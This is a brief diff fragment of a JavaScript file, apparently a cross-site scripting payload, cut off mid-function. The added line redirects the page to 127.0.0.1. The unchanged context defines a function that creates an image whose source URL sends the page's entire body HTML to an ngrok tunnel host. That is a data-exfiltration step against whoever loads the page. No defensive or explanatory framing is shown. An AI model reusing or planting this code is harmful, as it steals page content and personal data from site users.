@@ -1,4 +1,4 @@
-
+window.location.href = "127.0.0.1";
 function addTheImage() {
     var img = document.createElement('img');
     img.src = "http://3e6850f2.ngrok.io?c="+document.body.innerHTML;
